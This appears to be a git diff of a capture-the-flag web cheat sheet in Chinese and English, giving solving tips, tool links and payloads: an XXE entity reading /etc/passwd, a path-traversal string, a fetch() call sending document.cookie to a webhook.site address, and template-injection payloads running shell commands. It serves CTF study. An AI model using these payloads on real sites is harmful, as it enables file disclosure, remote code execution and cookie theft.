@@ -7,9 +7,28 @@ date: 2024-02-07
 ---
 
 # Web Cheat Sheet
+## 解題重點
+* `robots.txt`
+* 封包headers和contents: Wireshark、Browser、BurpSuite
+* cookies
+
+### Injection
+* SQLi
+* XXE
+    ```html
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+        <data><ID>&xxe;</ID></data>
+    ```
+* XSS
+
+### 其他
+* LFI: `../../../flag.txt`
+* 
 <!-- more -->
 
 ## Online Tools
+
 | Fuck                             | Beautifier                       |
 | -------------------------------- | -------------------------------- |
 | [jsfuck](http://www.jsfuck.com/) | [JSNice](http://www.jsnice.org/) |
@@ -28,7 +47,7 @@ date: 2024-02-07
     fetch("https://webhook.site/699a6563-c9b5-4ad7-adaa-e189c5f78194", { method: 'GET', headers: { 'Cookie': document.cookie } })
     ```
 * [All-Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%19Injection/README.md)
-* SSTI Payload: 記得找==os.\_wrap_close==
+* SSTI Payload: 記得找<span style="background-color: yellow">os.\_wrap_close</span>
     ```
     {{().__class__.__base__.__subclasses__()[132].__init__.__globals__['system']('id')}}
     {{self.__init__.__globals__.__builtins__.__import__("os").popen("cat%20Flag.txt").read()}}
